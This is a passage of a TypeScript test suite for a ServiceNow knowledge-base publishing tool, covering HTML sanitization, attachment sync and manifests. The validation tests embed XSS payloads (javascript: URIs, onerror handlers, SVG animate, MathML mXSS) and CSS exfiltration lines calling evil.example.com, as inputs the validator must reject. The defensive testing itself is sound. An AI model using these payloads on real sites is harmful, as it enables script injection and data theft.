        assert.doesNotThrow(() => htmlValidate.validateHtmlContent(html, false));
    });

    it('throws on a non-image data: URI when force=false', () => {
        const html = '<html><body><a href="data:text/html,alert">x</a></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, false),
            /data: URIs are not allowed|DangerousUriNotAllowed/,
        );
    });

    it('does not throw on an image data: URI (allowed)', () => {
        const html = '<html><body><img src="data:image/png;base64,iVBORw0KGgo="></body></html>';
        assert.doesNotThrow(() => htmlValidate.validateHtmlContent(html, false));
    });

    it('throws on a <base> element even when force=true (#446: force no longer bypasses XSS checks)', () => {
        const html = '<html><head><base href="//evil.example.com/"></head><body><p>x</p></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, true),
            /<base> elements and <meta http-equiv="refresh">|BaseOrMetaRefreshNotAllowed/,
        );
    });

    it('throws on an <iframe srcdoc="..."> that was never checked (final review: the gate never rejected iframe/object/embed/noscript before)', () => {
        // Untrusted HTML supplied directly via the htmlFile input bypasses
        // Markdown2Html's render-time sanitizer entirely -- this fail-closed
        // gate must reject iframe/object/embed/noscript on its own, not rely on
        // the upstream sanitizer having already stripped them.
        const html = '<html><body><iframe srcdoc="<img src=x onerror=alert(1)>"></iframe></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, false),
            /<iframe>\/<object>\/<embed>\/<noscript>|FormOrSvgAnimationNotAllowed/,
        );
    });

    it('throws on <object>/<embed>/<noscript> elements alongside iframe', () => {
        for (const html of [
            '<html><body><object data="javascript:alert(1)"></object></body></html>',
            '<html><body><embed src="javascript:alert(1)"></embed></body></html>',
            '<html><body><noscript><img src=x onerror=alert(1)></noscript></body></html>',
        ]) {
            assert.throws(
                () => htmlValidate.validateHtmlContent(html, false),
                /<iframe>\/<object>\/<embed>\/<noscript>|FormOrSvgAnimationNotAllowed/,
                `expected a throw for: ${html}`,
            );
        }
    });

    it('throws on an <iframe> even when force=true (#446: force no longer bypasses XSS checks)', () => {
        const html = '<html><body><iframe srcdoc="<img src=x onerror=alert(1)>"></iframe></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, true),
            /<iframe>\/<object>\/<embed>\/<noscript>|FormOrSvgAnimationNotAllowed/,
        );
    });

    it('throws on a <form> element when force=false (#446 follow-up: form action="javascript:..." blocklist gap)', () => {
        const html = '<html><body><form action="javascript:alert(1)"><button>Submit</button></form></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, false),
            /<form> elements and SVG SMIL animation elements|FormOrSvgAnimationNotAllowed/,
        );
    });

    it('throws on a <form> element even when force=true (#446: force no longer bypasses XSS checks)', () => {
        const html = '<html><body><form action="https://example.com/submit"><button>Submit</button></form></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, true),
            /<form> elements and SVG SMIL animation elements|FormOrSvgAnimationNotAllowed/,
        );
    });

    it('throws on an SVG SMIL <animate> element that could reassign href to a javascript: URI (#446 follow-up)', () => {
        const html = '<html><body><svg><a href="#safe"><animate attributeName="href" to="javascript:alert(1)"/>x</a></svg></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, false),
            /<form> elements and SVG SMIL animation elements|FormOrSvgAnimationNotAllowed/,
        );
    });

    it('throws on animateTransform, animateMotion, animateColor and set elements alongside animate', () => {
        for (const tag of ['animateTransform', 'animateMotion', 'animateColor', 'set']) {
            const html = `<html><body><svg><${tag} attributeName="href" to="javascript:alert(1)"/></svg></body></html>`;
            assert.throws(
                () => htmlValidate.validateHtmlContent(html, false),
                /<form> elements and SVG SMIL animation elements|FormOrSvgAnimationNotAllowed/,
                `expected a throw for <${tag}>`,
            );
        }
    });

    it('throws on MathML mXSS carriers (<math>, <annotation-xml encoding="text/html">) (#552)', () => {
        const html = '<html><body><math><annotation-xml encoding="text/html"><img src="x"></annotation-xml></math></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, false),
            /MathML|FormOrSvgAnimationNotAllowed/,
        );
    });

    it('throws on mglyph/malignmark/foreignObject foreign-content elements (#552)', () => {
        for (const html of [
            '<html><body><mglyph>x</mglyph></body></html>',
            '<html><body><malignmark>x</malignmark></body></html>',
            '<html><body><svg><foreignObject><div>x</div></foreignObject></svg></body></html>',
        ]) {
            assert.throws(
                () => htmlValidate.validateHtmlContent(html, false),
                /MathML|FormOrSvgAnimationNotAllowed/,
                `expected a throw for: ${html}`,
            );
        }
    });

    it('throws on a data:image/svg+xml URI even on an <img> element (an SVG document can embed active content, unlike a raster format)', () => {
        const html = '<html><body><img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, false),
            /data: URIs are not allowed|DangerousUriNotAllowed/,
        );
    });

    it('throws on a data:image/svg+xml URI on non-<img> elements (<a href>, <button formaction>)', () => {
        const anchorHtml = '<html><body><a href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">x</a></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(anchorHtml, false),
            /data: URIs are not allowed|DangerousUriNotAllowed/,
        );

        // Not wrapped in <form>: this specifically tests the formaction
        // attribute check (a standalone <button> is valid HTML), independent
        // of the separate <form>-element rejection covered above.
        const formHtml = '<html><body><button formaction="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">x</button></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(formHtml, false),
            /data: URIs are not allowed|DangerousUriNotAllowed/,
        );
    });

    it('throws on a javascript: <meta http-equiv="refresh"> even when force=true (#446: force no longer bypasses XSS checks)', () => {
        const html = '<html><head><meta http-equiv="refresh" content="0;url=javascript:alert(1)"></head><body><p>x</p></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, true),
            /<base> elements and <meta http-equiv="refresh">|BaseOrMetaRefreshNotAllowed/,
        );
    });

    it('throws on a dangerous URI even when force=true (#446: force no longer bypasses XSS checks)', () => {
        const html = '<html><body><a href="javascript:alert(1)">x</a></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, true),
            /javascript:.*URIs are not allowed|DangerousUriNotAllowed/,
        );
    });

    it('throws on content loss when force=false (#38: was previously mislabeled -- asserted doesNotThrow with force=true)', () => {
        // A DOCTYPE's public-identifier padding is discarded on serialization
        // (cheerio/dom-serializer always emits a bare "<!doctype html>"),
        // reliably producing >50% content loss without relying on parser-version-
        // specific tag-soup behavior.
        const badHtml = `<!DOCTYPE html PUBLIC "${'x'.repeat(3000)}"><html><body><p>hi</p></body></html>`;
        assert.throws(
            () => htmlValidate.validateHtmlContent(badHtml, false),
            /significant content loss|HtmlContentLoss/,
        );
    });

    it('warns instead of throwing on content loss when force=true (the one heuristic force still covers)', () => {
        const badHtml = `<!DOCTYPE html PUBLIC "${'x'.repeat(3000)}"><html><body><p>hi</p></body></html>`;
        assert.doesNotThrow(() => htmlValidate.validateHtmlContent(badHtml, true));
    });

    // -----------------------------------------------------------------------
    // #523: <style>/<link> handling
    // -----------------------------------------------------------------------

    it('does not throw on the trusted Markdown2Html document wrapper\'s <style> (no url(...)/@import) (#523)', () => {
        // Markdown2Html's generateHtmlDocument() unconditionally injects its own
        // <head><style>...</style></head> into every document it produces, and the
        // documented Markdown2Html -> PublishKbArticle pipeline feeds that whole
        // generated document into this task's htmlFile input verbatim. ServiceNow
        // is verified to preserve and render that block, so this gate must not
        // reject its own upstream task's legitimate output.
        const html = '<html><head><style>body{color:#333;padding:20px}pre{background-color:#f6f8fa}</style></head><body><p>hi</p></body></html>';
        assert.doesNotThrow(() => htmlValidate.validateHtmlContent(html, false));
    });

    it('throws on <style> content containing url(...) regardless of location, incl. inside <head> (#523)', () => {
        // A structural "reject <style> outside <head>" check would be trivially
        // defeated by an attacker who simply wraps a hostile <style> in its own
        // <head> -- the check must key on the CSS content, not the element's
        // position in the document, to withstand a deliberate raw-htmlFile bypass.
        const html = '<html><head><style>body{background:url(https://evil.example.com/exfil?x=1)}</style></head><body><p>hi</p></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, false),
            /url\(\.\.\.\).*not allowed|DangerousStyleContentNotAllowed/,
        );
    });

    it('throws on a bare <style> containing @import with no surrounding <head>/<body> structure (#523)', () => {
        const html = '<style>@import url(https://evil.example.com/exfil.css);</style><p>hi</p>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, false),
            /url\(\.\.\.\).*not allowed|DangerousStyleContentNotAllowed/,
        );
    });

    it('throws on dangerous <style> content even when force=true (#523: not a force-bypassable heuristic)', () => {
        const html = '<html><head><style>body{background:url(https://evil.example.com/exfil)}</style></head><body><p>hi</p></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, true),
            /url\(\.\.\.\).*not allowed|DangerousStyleContentNotAllowed/,
        );
    });

    it('throws on a <link rel="stylesheet"> via the shared DANGEROUS_TAGS gate (#523)', () => {
        const html = '<html><head><link rel="stylesheet" href="https://evil.example.com/exfil.css"></head><body><p>hi</p></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, false),
            /<iframe>\/<object>\/<embed>\/<noscript>\/<link>|FormOrSvgAnimationNotAllowed/,
        );
    });

    it('throws on a <link> even when force=true (#523: force never bypasses XSS/injection checks)', () => {
        const html = '<html><head><link rel="stylesheet" href="https://evil.example.com/exfil.css"></head><body><p>hi</p></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, true),
            /<iframe>\/<object>\/<embed>\/<noscript>\/<link>|FormOrSvgAnimationNotAllowed/,
        );
    });

    it('throws on an inline style="" attribute carrying a background:url(...) exfiltration payload (#523)', () => {
        // The simplest delivery mechanism for #523's core attack: the same
        // network-fetching CSS construct the <style>-element check rejects, but
        // carried in an inline style ATTRIBUTE the element check never inspects.
        const html = '<html><body><div style="background:url(https://evil.example.com/exfil?leak=1)">hi</div></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, false),
            /inline style attribute containing url\(\.\.\.\)|DangerousStyleAttributeNotAllowed/,
        );
    });

    it('throws on a dangerous inline style attribute even when force=true (#523: not a force-bypassable heuristic)', () => {
        const html = '<html><body><div style="background:url(https://evil.example.com/exfil)">hi</div></body></html>';
        assert.throws(
            () => htmlValidate.validateHtmlContent(html, true),
            /inline style attribute containing url\(\.\.\.\)|DangerousStyleAttributeNotAllowed/,
        );
    });

    it('throws on an inline style attribute using @import/expression/-moz-binding/behavior, not only url() (#523)', () => {
        for (const decl of ["@import 'x.css'", 'width:expression(alert(1))', '-moz-binding:url(#x)', 'behavior:url(x.htc)']) {
            const html = `<html><body><div style="${decl}">hi</div></body></html>`;
            assert.throws(
                () => htmlValidate.validateHtmlContent(html, false),
                /inline style attribute containing url\(\.\.\.\)|DangerousStyleAttributeNotAllowed/,
                `expected a throw for inline style: ${decl}`,
            );
        }
    });

    it('does not throw on a benign inline style attribute with no network-fetching CSS construct (#523: no false positive)', () => {
        const html = '<html><body><div style="text-align:right;color:#333;padding:4px">x</div></body></html>';
        assert.doesNotThrow(() => htmlValidate.validateHtmlContent(html, false));
    });

    it('does not throw on the Markdown2Html pagebreak separator\'s legitimate inline style (#523: real pipeline output must pass)', () => {
        // Markdown2Html's assembleDocument() joins include blocks with
        // <div class="page-break" style="page-break-after: always;"></div>, which
        // reaches this gate verbatim in the documented pipeline. "page-break-after"
        // holds no url()/@import/expression/-moz-binding/behavior: construct, so it
        // must not be mistaken for a CSS-exfiltration payload.
        const html = '<html><body><div class="page-break" style="page-break-after: always;"></div></body></html>';
        assert.doesNotThrow(() => htmlValidate.validateHtmlContent(html, false));
    });
});

// ===========================================================================
// dry-run report
// ===========================================================================
describe('formatDryRunReport', () => {
    it('reports a CREATE plan with content size', () => {
        const plan: DryRunPlan = {
            action: 'create',
            instance: 'acme',
            kbId: 'kb123',
            title: 'My Module',
            author: 'jdoe',
            workflowState: 'draft',
            contentBytes: 2048,
        };
        const report = formatDryRunReport(plan);
        assert.ok(report.includes('DRY RUN'));
        assert.ok(report.includes('CREATE new article'));
        assert.ok(report.includes('Instance:          acme'));
        assert.ok(report.includes('(new)'));
        assert.ok(report.includes('2048 bytes'));
        assert.ok(report.includes('-> draft'));
        assert.ok(report.includes('No write was performed'));
    });

    it('reports an UPDATE plan with current state and target sys_id', () => {
        const plan: DryRunPlan = {
            action: 'update',
            instance: 'acme',
            articleId: 'art_99',
            currentWorkflowState: 'draft',
            title: 'Updated',
            workflowState: 'published',
            contentBytes: 100,
        };
        const report = formatDryRunReport(plan);
        assert.ok(report.includes('UPDATE existing article'));
        assert.ok(report.includes('Target article:    art_99'));
        assert.ok(report.includes('Current state:     draft'));
        assert.ok(report.includes('-> published'));
    });

    it('reports a workflow-only plan', () => {
        const plan: DryRunPlan = {
            action: 'workflow-only',
            instance: 'acme',
            articleId: 'art_5',
            currentWorkflowState: 'draft',
            workflowState: 'published',
        };
        const report = formatDryRunReport(plan);
        assert.ok(report.includes('CHANGE workflow state only'));
        assert.ok(report.includes('Body content:      (none'));
    });

    it('shows source-key match status', () => {
        const matched = formatDryRunReport({
            action: 'update', instance: 'a', articleId: 'x',
            workflowState: 'draft', sourceKey: 'my-key', sourceKeyMatched: true,
        });
        assert.ok(matched.includes('my-key (matched existing article x)'));

        const unmatched = formatDryRunReport({
            action: 'create', instance: 'a',
            workflowState: 'draft', sourceKey: 'my-key', sourceKeyMatched: false,
        });
        assert.ok(unmatched.includes('no existing match (would create)'));
    });

    it('notes category auto-create is skipped in dry run', () => {
        const report = formatDryRunReport({
            action: 'create', instance: 'a', kbId: 'k',
            category: 'Terraform Modules', subcategory: 'AWS', workflowState: 'draft',
        });
        assert.ok(report.includes('Terraform Modules > AWS'));
        assert.ok(report.includes('skipped in dry run'));
    });
});

// ===========================================================================
// image-rewrite (pure logic)
// ===========================================================================
describe('image-rewrite', () => {
    const baseDir = '/repo';

    it('extracts relative <img> srcs and resolves them against the base dir', () => {
        const html = '<p><img src="./images/diagram.png"> and <img src="logo.svg"></p>';
        const refs = extractLocalImageRefs(html, baseDir);
        assert.strictEqual(refs.length, 2);
        assert.strictEqual(refs[0].fileName, 'diagram.png');
        assert.strictEqual(refs[0].absPath, nodePath.resolve(baseDir, 'images/diagram.png'));
        assert.strictEqual(refs[1].fileName, 'logo.svg');
    });

    it('skips external, protocol-relative, and data: srcs', () => {
        const html =
            '<img src="https://x.com/a.png"><img src="//cdn/b.png">' +
            '<img src="data:image/png;base64,AAAA"><img src="#anchor">';
        assert.deepStrictEqual(extractLocalImageRefs(html, baseDir), []);
    });

    it('de-duplicates repeated srcs', () => {
        const html = '<img src="a.png"><img src="a.png">';
        assert.strictEqual(extractLocalImageRefs(html, baseDir).length, 1);
    });

    it('strips query/fragment when resolving the file path', () => {
        const refs = extractLocalImageRefs('<img src="img/a.png?v=2">', baseDir);
        assert.strictEqual(refs[0].fileName, 'a.png');
        assert.strictEqual(refs[0].absPath, nodePath.resolve(baseDir, 'img/a.png'));
    });

    it('rewrites mapped srcs to sys_attachment.do and leaves unmapped ones', () => {
        const html = '<img src="a.png"><img src="b.png">';
        const map = new Map<string, string>([['a.png', 'att123']]);
        const out = rewriteImageSrcs(html, map);
        // Root-relative (leading slash) — the form ServiceNow's own KB articles use.
        assert.ok(out.includes('src="/sys_attachment.do?sys_id=att123"'));
        assert.ok(out.includes('src="b.png"'), 'unmapped src left unchanged');
    });

    it('returns html unchanged when the map is empty', () => {
        const html = '<img src="a.png">';
        assert.strictEqual(rewriteImageSrcs(html, new Map()), html);
    });

    it('skips a path-traversal src (../) that resolves outside the base dir', () => {
        const warnings: string[] = [];
        const html = '<img src="../outside.png">';
        const refs = extractLocalImageRefs(html, baseDir, (m) => warnings.push(m));
        assert.deepStrictEqual(refs, []);
        assert.ok(warnings.some((w) => w.includes('outside the image base directory') || w.includes('ImageSrcOutsideBaseDir')), `expected a warning; got: ${warnings}`);
    });

    it('skips a URL-encoded path-traversal src (..%2f) that resolves outside the base dir', () => {
        const warnings: string[] = [];
        const html = '<img src="..%2f..%2foutside.png">';
        const refs = extractLocalImageRefs(html, baseDir, (m) => warnings.push(m));
        assert.deepStrictEqual(refs, []);
        assert.ok(warnings.length > 0, 'expected a warning to be logged');
    });

    it('still includes an in-bounds nested src alongside a rejected traversal src', () => {
        const html = '<img src="sub/img.png"><img src="../outside.png">';
        const refs = extractLocalImageRefs(html, baseDir, () => { });
        assert.strictEqual(refs.length, 1);
        assert.strictEqual(refs[0].fileName, 'img.png');
        assert.strictEqual(refs[0].absPath, nodePath.resolve(baseDir, 'sub/img.png'));
    });
});

// ===========================================================================
// attachments — helpers
// ===========================================================================
describe('attachments helpers', () => {
    it('maps file extensions to content types', () => {
        assert.strictEqual(contentTypeFor('a.png'), 'image/png');
        assert.strictEqual(contentTypeFor('a.JPG'), 'image/jpeg');
        assert.strictEqual(contentTypeFor('a.svg'), 'image/svg+xml');
        assert.strictEqual(contentTypeFor('a.unknown'), 'application/octet-stream');
    });

    it('computes a sha256 of file bytes', () => {
        const dir = fs.mkdtempSync(nodePath.join(os.tmpdir(), 'att-test-'));
        const p = nodePath.join(dir, 'x.bin');
        fs.writeFileSync(p, Buffer.from('hello'));
        // sha256("hello")
        assert.strictEqual(
            fileSha256(p),
            '2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824',
        );
    });
});

// ===========================================================================
// attachments — response-shape validation + retry hardening (#561)
// ===========================================================================
describe('listArticleAttachments / uploadAttachment response hardening (#561)', () => {
    let tmpFile: string;

    before(() => {
        const dir = fs.mkdtempSync(nodePath.join(os.tmpdir(), 'att-hard-'));
        tmpFile = nodePath.join(dir, 'pic.png');
        fs.writeFileSync(tmpFile, Buffer.from('PNGDATA'));
    });

    it('listArticleAttachments retries a transient 5xx then returns the listed attachments', async () => {
        nock(BASE_URL)
            .get('/api/now/attachment')
            .query(true)
            .reply(503, { error: 'busy' })
            .get('/api/now/attachment')
            .query(true)
            .reply(200, { result: [{ sys_id: 'att1', file_name: 'pic.png' }] });

        const result = await listArticleAttachments(INSTANCE, HEADERS, 'art1');
        assert.strictEqual(result.length, 1);
        assert.strictEqual(result[0].sys_id, 'att1');
    });

    it('listArticleAttachments throws a clear diagnostic when "result" is not an array (2xx non-JSON body fallback)', async () => {
        // servicenow-http.ts defaults a 2xx body that fails JSON.parse to {} --
        // the previous `(response.data.result || [])` cast let that flow through
        // as {} and crash the caller's .find() with a bare TypeError.
        nock(BASE_URL).get('/api/now/attachment').query(true).reply(200, 'not json');

        await assert.rejects(
            () => listArticleAttachments(INSTANCE, HEADERS, 'art1'),
            /did not return an array|AttachmentListNotArray/,
        );
    });

    it('uploadAttachment throws a clear diagnostic when the response carries no string sys_id', async () => {
        nock(BASE_URL)
            .post('/api/now/attachment/file')
            .query(true)
            .reply(201, { result: {} });

        await assert.rejects(
            () => uploadAttachment(INSTANCE, HEADERS, 'art1', tmpFile, 'pic.png', 'image/png'),
            /did not return a sys_id|AttachmentUploadNoSysId/,
        );
    });
});

// ===========================================================================
// attachments — syncImageAttachment (nock-mocked)
// ===========================================================================
describe('syncImageAttachment', () => {
    let tmpFile: string;
    let tmpHash: string;

    before(() => {
        const dir = fs.mkdtempSync(nodePath.join(os.tmpdir(), 'att-sync-'));
        tmpFile = nodePath.join(dir, 'pic.png');
        fs.writeFileSync(tmpFile, Buffer.from('PNGDATA'));
        tmpHash = fileSha256(tmpFile);
    });

    it('reuses an existing attachment when the hash matches (no upload)', async () => {
        // No nock interceptors registered → any HTTP call would throw (netConnect disabled).
        const id = await syncImageAttachment(
            INSTANCE, HEADERS, 'art1', tmpFile, 'pic.png',
            [{ sys_id: 'existing_att', file_name: 'pic.png', hash: tmpHash }],
        );
        assert.strictEqual(id, 'existing_att');
    });

    it('deletes and re-uploads when the same filename has a different hash', async () => {
        nock(BASE_URL).delete('/api/now/attachment/old_att').reply(204);
        nock(BASE_URL)
            .post('/api/now/attachment/file')
            .query(true)
            .reply(201, { result: { sys_id: 'new_att' } });

        const id = await syncImageAttachment(
            INSTANCE, HEADERS, 'art1', tmpFile, 'pic.png',
            [{ sys_id: 'old_att', file_name: 'pic.png', hash: 'DIFFERENT' }],
        );
        assert.strictEqual(id, 'new_att');
    });

    it('uploads fresh when no existing attachment matches', async () => {
        nock(BASE_URL)
            .post('/api/now/attachment/file')
            .query(true)
            .reply(201, { result: { sys_id: 'fresh_att' } });

        const id = await syncImageAttachment(
            INSTANCE, HEADERS, 'art1', tmpFile, 'pic.png', [],
        );
        assert.strictEqual(id, 'fresh_att');
    });

    it('does not delete the old attachment when the replacement upload fails (non-atomic swap, upload-first)', async () => {
        nock(BASE_URL)
            .post('/api/now/attachment/file')
            .query(true)
            .reply(400, { error: { message: 'bad request' } });
        // Registered but must NEVER be triggered -- if syncImageAttachment still
        // deleted before uploading (the old order), this interceptor would be
        // consumed and .isDone() would report true.
        const deleteScope = nock(BASE_URL).delete('/api/now/attachment/old_att').reply(204);

        await assert.rejects(
            () => syncImageAttachment(
                INSTANCE, HEADERS, 'art1', tmpFile, 'pic.png',
                [{ sys_id: 'old_att', file_name: 'pic.png', hash: 'DIFFERENT' }],
            ),
        );
        assert.strictEqual(deleteScope.isDone(), false, 'the old attachment must not be deleted when the upload fails');
    });
});

// ===========================================================================
// attachments — processArticleimages (nock-mocked end-to-end)
// ===========================================================================
describe('processArticleImages', () => {
    let baseDir: string;

    before(() => {
        baseDir = fs.mkdtempSync(nodePath.join(os.tmpdir(), 'att-proc-'));
        fs.mkdirSync(nodePath.join(baseDir, 'images'), { recursive: true });
        fs.writeFileSync(nodePath.join(baseDir, 'images', 'd.png'), Buffer.from('IMG1'));
    });

    it('uploads referenced images and rewrites the body', async () => {
        nock(BASE_URL)
            .get('/api/now/attachment')
            .query(true)
            .reply(200, { result: [] });
        nock(BASE_URL)
            .post('/api/now/attachment/file')
            .query(true)
            .reply(201, { result: { sys_id: 'att_d' } });

        const html = '<p><img src="./images/d.png"></p>';
        const result = await processArticleImages(
            INSTANCE, HEADERS, 'art1', html, baseDir, false, () => { },
        );
        assert.strictEqual(result.uploaded, 1);
        assert.ok(result.html.includes('src="/sys_attachment.do?sys_id=att_d"'));
        assert.deepStrictEqual(result.missing, []);
    });

    it('skips missing images when failOnMissing is false', async () => {
        nock(BASE_URL).get('/api/now/attachment').query(true).reply(200, { result: [] });

        const html = '<img src="./images/nope.png">';
        const result = await processArticleImages(
            INSTANCE, HEADERS, 'art1', html, baseDir, false, () => { },
        );
        assert.strictEqual(result.uploaded, 0);
        assert.deepStrictEqual(result.missing, ['./images/nope.png']);
        assert.strictEqual(result.html, html, 'missing image src left unchanged');
    });

    it('throws on missing image when failOnMissing is true', async () => {
        nock(BASE_URL).get('/api/now/attachment').query(true).reply(200, { result: [] });

        await assert.rejects(
            () => processArticleImages(
                INSTANCE, HEADERS, 'art1', '<img src="gone.png">', baseDir, true, () => { },
            ),
            /Image not found|ImageNotFound/,
        );
    });

    it('returns body unchanged when there are no local images', async () => {
        const html = '<p>No images here, just <img src="https://x/y.png"></p>';
        const result = await processArticleImages(
            INSTANCE, HEADERS, 'art1', html, baseDir, false, () => { },
        );
        assert.strictEqual(result.uploaded, 0);
        assert.strictEqual(result.html, html);
    });

    // -----------------------------------------------------------------------
    // #509: mid-loop abort logging + retry
    // -----------------------------------------------------------------------

    it('#509: logs (tasks.warning) which attachments were already uploaded when a later image aborts the loop', async () => {
        fs.writeFileSync(nodePath.join(baseDir, 'images', 'first.png'), Buffer.from('IMG-FIRST'));
        nock(BASE_URL).get('/api/now/attachment').query(true).reply(200, { result: [] });
        nock(BASE_URL)
            .post('/api/now/attachment/file')
            .query(true)
            .reply(201, { result: { sys_id: 'att_first' } });

        const html = '<p><img src="./images/first.png"><img src="./images/missing.png"></p>';
        await assert.rejects(
            () => processArticleImages(INSTANCE, HEADERS, 'art1', html, baseDir, /* failOnMissing */ true, () => { }),
            /Image not found|ImageNotFound/,
        );

        assert.strictEqual(capturedWarnings.length, 1, `expected exactly one abort warning: ${capturedWarnings}`);
        assert.ok(
            capturedWarnings[0].includes('first.png'),
            `warning should name the already-uploaded attachment: ${capturedWarnings[0]}`,
        );
    });

    it('#509: does not log an abort warning when the loop completes without aborting', async () => {
        nock(BASE_URL).get('/api/now/attachment').query(true).reply(200, { result: [] });
        nock(BASE_URL)
            .post('/api/now/attachment/file')
            .query(true)
            .reply(201, { result: { sys_id: 'att_ok' } });

        const html = '<p><img src="./images/d.png"></p>';
        const result = await processArticleImages(INSTANCE, HEADERS, 'art1', html, baseDir, false, () => { });

        assert.strictEqual(result.uploaded, 1);
        assert.strictEqual(capturedWarnings.length, 0, `expected no abort warning on success: ${capturedWarnings}`);
    });

    it('#509: retries a transient failure on the delete step of a hash-mismatch replace', async () => {
        // deleteAttachment (unlike uploadAttachment) previously had no retry of
        // its own -- syncImageAttachment now wraps that specific call in
        // withRetry too, giving the delete step the same transient-failure
        // resilience as the upload step, without re-running the (already
        // succeeded) upload on a delete retry.
        nock(BASE_URL).get('/api/now/attachment').query(true).reply(200, {
            result: [{ sys_id: 'old_att', file_name: 'd.png', hash: 'DIFFERENT-HASH' }],
        });
        nock(BASE_URL)
            .post('/api/now/attachment/file')
            .query(true)
            .reply(201, { result: { sys_id: 'att_replaced' } });
        nock(BASE_URL)
            .delete('/api/now/attachment/old_att')
            .reply(503, { error: 'busy' });
        nock(BASE_URL)
            .delete('/api/now/attachment/old_att')
            .reply(204);

        const html = '<p><img src="./images/d.png"></p>';
        const result = await processArticleImages(INSTANCE, HEADERS, 'art1', html, baseDir, false, () => { });
        assert.strictEqual(result.uploaded, 1);
        assert.ok(result.html.includes('att_replaced'));
    });
});

// ---------------------------------------------------------------------------
// manifest
// ---------------------------------------------------------------------------

function tmpDir(): string {
    return fs.mkdtempSync(nodePath.join(os.tmpdir(), 'kbmanifest-'));
}

describe('manifest.readFrontMatterKey', () => {
    function tmpMd(content: string): string {
        const p = nodePath.join(tmpDir(), 'doc.md');
        fs.writeFileSync(p, content, 'utf8');
        return p;
    }

    it('extracts the kb-key value from front matter', () => {
        assert.strictEqual(manifest.readFrontMatterKey(tmpMd('---\ntitle: X\nkb-key: my-key\n---\n# Body\n')), 'my-key');
    });

    it('strips surrounding quotes from the key', () => {
        assert.strictEqual(manifest.readFrontMatterKey(tmpMd('---\nkb-key: "quoted-key"\n---\nBody\n')), 'quoted-key');
    });

    it('throws when there is no front matter', () => {
        assert.throws(() => manifest.readFrontMatterKey(tmpMd('# No front matter\n')), /No YAML front-matter/);
    });

    it('throws when kb-key is missing', () => {
        assert.throws(() => manifest.readFrontMatterKey(tmpMd('---\ntitle: X\n---\nBody\n')), /No 'kb-key:'/);
    });

    it('throws when the file cannot be read', () => {
        assert.throws(() => manifest.readFrontMatterKey('/no/such/file-xyz.md'), /Error reading/);
    });
});

describe('manifest.appendToManifest', () => {
    it('creates a new manifest file with the entry', () => {
        const p = nodePath.join(tmpDir(), 'kb-manifest.json');
        manifest.appendToManifest(p, { sys_id: 'a1' });
        assert.deepStrictEqual(JSON.parse(fs.readFileSync(p, 'utf8')), [{ sys_id: 'a1' }]);
    });

    it('appends to an existing manifest', () => {
        const p = nodePath.join(tmpDir(), 'kb-manifest.json');
        fs.writeFileSync(p, JSON.stringify([{ sys_id: 'a1' }]), 'utf8');
        manifest.appendToManifest(p, { sys_id: 'a2' });
        const written = JSON.parse(fs.readFileSync(p, 'utf8'));
        assert.strictEqual(written.length, 2);
        assert.strictEqual(written[1].sys_id, 'a2');
    });

    it('recovers from a corrupt existing manifest', () => {
        const p = nodePath.join(tmpDir(), 'kb-manifest.json');
        fs.writeFileSync(p, 'not json', 'utf8');
        manifest.appendToManifest(p, { sys_id: 'a1' });
        assert.deepStrictEqual(JSON.parse(fs.readFileSync(p, 'utf8')), [{ sys_id: 'a1' }]);
    });

    it('#564: surfaces a manifest write failure as a pipeline warning (tasks.warning) without throwing', () => {
        // A path inside a directory that does not exist makes writeFileSync throw
        // (ENOENT) on every platform without touching the corrupt-manifest branch.
        const p = nodePath.join(tmpDir(), 'no-such-subdir', 'kb-manifest.json');
        assert.doesNotThrow(() => manifest.appendToManifest(p, { sys_id: 'a1' }));
        assert.ok(
            capturedWarnings.some(w => /ManifestWriteFailed|Could not write manifest/.test(w)),
            `expected the manifest-write failure to surface via tasks.warning: ${capturedWarnings}`,
        );
    });
});

describe('manifest.emitArticleOutput / findKbArticleJson', () => {
    const article = {
        sys_id: 'sys-1',
        number: 'KB0001',
        kb_knowledge_base: 'kb-1',
        short_description: 'Title',
        workflow_state: 'published',
        author: 'alice',
    };

    it('appends to the manifest path when provided', () => {
        const p = nodePath.join(tmpDir(), 'manifest.json');
        manifest.emitArticleOutput(article, 'my-key', p, 'kb-1');
        const written = JSON.parse(fs.readFileSync(p, 'utf8'));
        assert.strictEqual(written[0].sys_id, 'sys-1');
        assert.strictEqual(written[0].source_key, 'my-key');
    });

    it('writes a legacy KB<number>.json file and finds it (no manifest path)', () => {
        const cwd = process.cwd();
        process.chdir(tmpDir());
        try {
            manifest.emitArticleOutput(article, undefined, undefined, undefined);
            assert.ok(fs.existsSync('KB0001.json'), 'legacy json file should exist');
            const found = manifest.findKbArticleJson();
            assert.ok(found);
            assert.strictEqual(found!['article_id'], 'sys-1');
        } finally {
            process.chdir(cwd);
        }
    });

    it('#564: surfaces a legacy KB-json write failure as a pipeline warning (tasks.warning) without throwing', () => {
        const cwd = process.cwd();
        process.chdir(tmpDir());
        try {
            // A number containing a path separator into a directory that does not
            // exist makes writeFileSync throw (ENOENT) on every platform.
            assert.doesNotThrow(() => manifest.outputArticleInfoToJson({ ...article, number: 'no-such-dir/KB0001' }));
            assert.ok(
